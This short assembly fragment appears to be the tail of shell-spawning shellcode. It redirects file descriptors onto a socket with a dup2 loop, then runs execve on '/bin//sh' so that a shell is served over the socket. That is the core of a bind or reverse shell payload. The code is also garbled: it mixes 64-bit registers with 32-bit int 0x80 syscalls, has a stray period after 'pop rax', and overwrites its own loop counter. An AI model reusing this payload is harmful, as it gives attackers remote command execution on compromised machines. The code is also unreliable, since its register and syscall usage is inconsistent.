mov rbx, r9             ;put the file descriptor into rbx
xor rcx, rcx
push byte 0x2
pop rax.
dup_loop:
    mov byte al, 0x3F   ; dup2, syscall 63
    int 0x80
    dec rax
    jns dup_loop

; Execute shell with IO on socket
mov byte al, 11         ; execve syscall
push rdx                ; string termination nulls
push 0x68732f2f         ; //sh
push 0x6e69622f         ; /bin
mov rbx, rsp            ; ptr to /bin/sh
push rcx                ; null terminator

mov rdx, rsp            ; null envp array

push rbx                ; first string of argv
mov ecx, esp            ; ptr to argv
int 0x80
